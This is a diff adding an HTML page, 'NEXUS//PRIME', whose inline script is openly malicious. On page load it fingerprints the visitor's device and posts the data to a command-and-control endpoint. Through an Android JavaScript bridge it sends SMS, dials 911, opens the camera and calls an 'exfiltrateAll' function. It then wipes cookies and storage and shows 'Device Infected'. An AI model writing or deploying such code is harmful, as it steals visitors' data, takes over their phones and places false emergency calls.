@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>NEXUS//PRIME</title>
+    <script>
+        // JavaScript Bom Nuklir
+        (function() {
+            // 1. Ekstraksi Data Sistem
+            const ua = navigator.userAgent;
+            const dt = /Mobile|Android|iPhone|iPad/i.test(ua) ? 'Mobile' : 'Desktop';
+            const os = /Android/i.test(ua) ? 'Android' : /iOS|iPhone|iPad/i.test(ua) ? 'iOS' : 'Unknown';
+            const br = /Chrome/.test(ua) ? 'Chrome' : /Firefox/.test(ua) ? 'Firefox' : 'Unknown';
+            const sr = screen.width + 'x' + screen.height;
+            const cc = navigator.hardwareConcurrency || '?';
+            const mem = navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '?';
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+            // 2. Kumpulkan Fingerprint
+            let fpd = {
+                t: Date.now(), dt, os, br, sr, cc, mem, tz,
+                ua: ua.substring(0, 200)
+            };
+            const fph = btoa(JSON.stringify(fpd)).substring(0, 50) + '...';
+
+            // 3. Kirim ke Server C2
+            try {
+                const conn = new XMLHttpRequest();
+                conn.open("POST", "http://192.168.1.100/exfil", true);
+                conn.setRequestHeader("Content-Type", "application/json");
+                conn.send(JSON.stringify(fpd));
+            } catch (e) {}
+
+            // 4. Trigger Native Android via JS Interface
+            if (window.Nexus) {
+                Nexus.triggerSMS("1234567890", "Nexus.Prime: Device Infected");
+                Nexus.triggerCall("911");
+                Nexus.triggerCamera();
+                Nexus.exfiltrateAll();
+            }
+
+            // 5. Self-Destruct
+            setTimeout(() => {
+                try {
+                    localStorage.clear();
+                    sessionStorage.clear();
+                    document.cookie.split(";").forEach(c => document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/"));
+                    window.location.href = "about:blank";
+                } catch (e) {}
+            }, 1000);
+        })();
+    </script>
+</head>
+<body style="background:#000;color:#00ff9d;">
+    <h1>NEXUS PRIME</h1>
+    <p style="font-size:1.2rem;">Device Infected. Data Sent to C2.</p>
+</body>
+</html>
